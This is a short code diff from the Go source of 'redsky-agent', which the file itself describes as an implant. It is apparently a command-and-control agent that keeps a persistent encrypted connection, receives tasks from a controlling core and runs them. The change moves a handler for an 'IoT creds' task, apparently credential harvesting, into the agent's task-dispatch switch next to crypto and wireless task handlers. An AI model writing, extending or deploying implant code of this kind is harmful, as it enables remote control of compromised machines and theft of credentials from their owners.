@@ -1,10 +1,3 @@
-		case proto.TypeIoTCredsStart:
-			var ic proto.IoTCredsStart
-			if err := json.Unmarshal(env.Payload, &ic); err != nil {
-				log.Printf("[iotcreds] unmarshal: %v", err)
-				continue
-			}
-			go runIoTCreds(conn, sess, ic)
 // redsky-agent — the implant.
 // Phase 5: persistent connection. One TLS + ECDH handshake, then a loop that
 // reads tasks, executes them, and sends results until the core closes the
@@ -237,6 +230,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runCrypto(conn, sess, cs)
+		case proto.TypeIoTCredsStart:
+			var ic proto.IoTCredsStart
+			if err := json.Unmarshal(env.Payload, &ic); err != nil {
+				log.Printf("[iotcreds] unmarshal: %v", err)
+				continue
+			}
+			go runIoTCreds(conn, sess, ic)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
